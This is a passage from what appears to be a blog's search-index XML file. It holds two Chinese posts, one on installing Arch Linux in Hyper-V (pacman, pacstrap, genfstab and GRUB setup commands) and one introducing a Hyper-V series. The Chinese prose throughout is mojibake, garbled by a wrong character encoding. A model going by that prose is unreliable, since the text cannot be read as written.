/mnt/home<br></code></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯å®‰è£…ç³»ç»Ÿã€‚é¦–å…ˆå…ˆæ›´æ–°è½¯ä»¶åº“ï¼Œæ¥ç€æ›´æ–°å¯†é’¥ç¯ï¼ˆå¦‚æœé•¿æ—¶é—´ä¸æ›´æ–°å¯†é’¥ç¯ä¼šå¯¼è‡´è¿‡æœŸè¯ä¹¦æ— æ³•æ›´æ–°ï¼Œè½¯ä»¶å®‰è£…æ£€æŸ¥è¿‡ä¸äº†ï¼‰ï¼Œæœ€åä¸€é”®å®‰è£…ç³»ç»Ÿã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">pacman -Syy<br>pacman -Sy archlinux-keyring<br>pacstrap -K /mnt base linux grub efibootmgr neovim<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹ <code>pacstrap</code> å®‰è£…çš„å‡ ä¸ªè½¯ä»¶åŒ…ï¼š</p><ul><li><code>base</code> æ˜¯å¿…é¡»çš„</li><li><code>linux</code> å¯ä»¥é€‰æ‹©å…¶<ahref="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8#%E5%AE%98%E6%96%B9%E6%94%AF%E6%8C%81%E7%9A%84%E5%86%85%E6%A0%B8">å˜ç§</a></li><li><code>grub</code> å’Œ <code>efibootmgr</code> æ˜¯ä¸ºäº†å®‰è£…å’Œç®¡ç† GRUBå¯åŠ¨å™¨çš„åŒ…ï¼Œåé¢ä¼šç”¨åˆ°</li><li><code>neovim</code> æ˜¯ä¸ºäº†é˜²æ­¢æ²¡æœ‰è¶æ‰‹çš„ç¼–è¾‘å™¨ã€‚</li></ul><p>å¦‚æœä½ è¿˜æƒ³è¦å®‰è£…å…¶å®ƒè½¯ä»¶ï¼ˆAURä»“åº“çš„å¾—åˆ°åé¢å®‰è£…äº†ï¼‰ï¼Œå¯ä»¥ç›´æ¥åœ¨åé¢æ·»åŠ å°±å®Œäº‹äº†ã€‚</p><h3 id="é…ç½®ç³»ç»Ÿ">é…ç½®ç³»ç»Ÿ</h3><p>ç³»ç»Ÿå·²ç»å®‰è£…å®Œå•¦ï¼Œä¸‹é¢æˆ‘ä»¬åº”è¯¥æ¥é…ç½®ç³»ç»Ÿäº†ã€‚æœ‰ä¸¤é¡¹å·¥ä½œè¦åšï¼Œä¸€æ˜¯ç”Ÿæˆ<code>fstab</code>ï¼Œåœ¨åé¢çš„å¯åŠ¨è¿‡ç¨‹ä¸­å¦‚ä½•æŒ‚è½½ç£ç›˜ï¼ŒäºŒæ˜¯é…ç½® GRUBå¼•å¯¼å™¨æ¥å¼•å¯¼æ“ä½œç³»ç»Ÿã€‚</p><ol type="1"><li><p>ç”Ÿæˆ <code>fstab</code></p><p>å‘½ä»¤å¦‚ä¸‹ï¼Œç»“æœå¦‚å›¾2-2-5æ‰€ç¤º</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-5.png" class="" title="ç”Ÿæˆ fstab"></p></li><li><p>é…ç½® GRUB</p><p>é¦–å…ˆåˆ‡æ¢åˆ°å®‰è£…å¥½çš„ç³»ç»Ÿä¸‹é¢</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arch-chroot /mnt<br></code></pre></td></tr></table></figure></p><p>ç„¶åï¼Œå®‰è£… GRUB å¹¶ç”Ÿæˆé…ç½®</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure></p></li></ol><h2 id="å–„åå·¥ä½œ">å–„åå·¥ä½œ</h2><p>è‡³æ­¤ï¼ŒArchlinux å·²ç»å®Œæ•´åœ°å®‰è£…åœ¨ä½ çš„è™šæ‹Ÿç¡¬ç›˜ä¸­äº†ã€‚ç”¨<code>exit</code> é€€å‡ºå®‰è£…å¥½çš„ Archlinux ç³»ç»Ÿï¼Œå† <code>poweroff</code>å…³æ‰å®‰è£…ç³»ç»Ÿä»¥å…³é—­è™šæ‹Ÿæœºã€‚è®¾ç½®å¯åŠ¨é¡ºåºï¼Œè¿™é‡Œéœ€è¦å°† DVDé©±åŠ¨å™¨åˆ é™¤ï¼Œæ¥ç€å°† <code>grubx64.efi</code>ç§»åŠ¨åˆ°æœ€ä¸Šé¢ï¼Œä¿å­˜è®¾ç½®åå°±ç®—å®Œæˆå•¦ã€‚æœ€ç»ˆç»“æœå¦‚å›¾3-1æ‰€ç¤º</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig3-1.png" class="" title="è®¾ç½®å¯åŠ¨é¡ºåº"><p>ä¸‹ä¸€ç¯‡ä¸»è¦ä»‹ç»ç³»ç»Ÿä¸­æ¡Œé¢ç¯å¢ƒçš„å®‰è£…åŠé…ç½®ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hyper-V æ¢é™©è®°å½•ï¼ˆç›®å½•ï¼‰</title>
    <link href="/2024/07/18/hyper-v-adventure/content/"/>
    <url>/2024/07/18/hyper-v-adventure/content/</url>
    
    <content type="html"><![CDATA[<p>ä½ è¯´å¾—å¯¹ï¼Œä½†æ˜¯ Hyper-V æ˜¯å·¨ç¡¬å¼€å‘çš„ä¸€æ¬¾æœ¬åœ°è™šæ‹Ÿæœºç®¡ç†ç¨‹åºã€‚</p><span id="more"></span><blockquote><p>è®¸å¤šè™šæ‹ŸåŒ–åº”ç”¨ç¨‹åºä¾èµ–äºå¤§å¤šæ•°æ–°å¼å¤„ç†å™¨ä¸Šå¯ç”¨çš„ç¡¬ä»¶è™šæ‹ŸåŒ–æ‰©å±•ã€‚å®ƒåŒ…æ‹¬Intel VT-x å’ŒAMD-Vã€‚ä¸€æ¬¡åªèƒ½æœ‰ä¸€ä¸ªè½¯ä»¶ç»„ä»¶ä½¿ç”¨æ­¤ç¡¬ä»¶ã€‚æ— æ³•åœ¨è™šæ‹ŸåŒ–åº”ç”¨ç¨‹åºä¹‹é—´å…±äº«ç¡¬ä»¶ã€‚</p><footer><strong>Microsoft</strong><cite><a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/application-management/virtualization-apps-not-work-with-hyper-v#cause">virtualization-apps-not-work-with-hyper-v</a></cite></footer></blockquote><p>è€Œå½¢å¦‚ WSLã€Docker ç­‰åº”ç”¨éƒ½éœ€è¦å¯ç”¨ Hyper-VæŠ€æœ¯ã€‚å› æ­¤ï¼Œä¸€æ—¦éœ€è¦ä½¿ç”¨è™šæ‹Ÿæœºç›¸å…³çš„è™šæ‹ŸåŒ–è½¯ä»¶ï¼Œä¾‹å¦‚ï¼šVirtualBoxç­‰ï¼Œå°±æ— æ³•ä½¿ç”¨<strong>ç¡¬ä»¶è™šæ‹ŸåŒ–æ‰©å±•</strong>æŠ€æœ¯ã€‚å½“å‰VirtualBox ç­‰è™šæ‹Ÿæœºè½¯ä»¶ä¼šè°ƒç”¨ Hyper-V æä¾›çš„è™šæ‹ŸåŒ– APIæ¥å®ç°è½¯ä»¶è™šæ‹ŸåŒ–ï¼Œä½†æ˜¯æ€§èƒ½ä¼šå¤§æ‰“æŠ˜æ‰£ã€‚æ‰€ä»¥ä¸ºäº†æ€§èƒ½ï¼Œä¸å¾—ä¸å‘ Hyper-Vä½å¤´ã€‚</p><p>æœ¬ç³»åˆ—è®°å½•äº†åœ¨æ¢ç´¢ Hyper-V è¿‡ç¨‹ä¸­çš„ä¸€äº›å€¼å¾—è®°å½•çš„å†…å®¹ï¼Œä¸å®šæœŸæ›´æ–°</p>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ç›®å½•</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
